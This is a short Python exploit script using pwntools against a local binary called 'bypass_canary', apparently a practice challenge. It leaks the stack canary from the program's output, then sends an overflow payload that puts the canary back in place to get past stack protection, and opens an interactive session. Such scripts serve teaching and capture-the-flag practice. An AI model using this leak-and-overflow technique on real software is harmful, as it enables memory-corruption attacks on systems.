from pwn import *

p = process("./bypass_canary")

p.sendline(b"aaaaaaaa")

canary = p.recv()
print(canary)
canary = canary[22:]
canary = canary[:-1]
print(canary)
# print(len(canary))
canary = u64(b"\x00" + canary)


payload = b"mmmmmmmm"
payload += b"nnnnnnnn"
payload += p64(canary)
payload += b"sfppsfpp"

p.sendline(payload)


p.interactive()
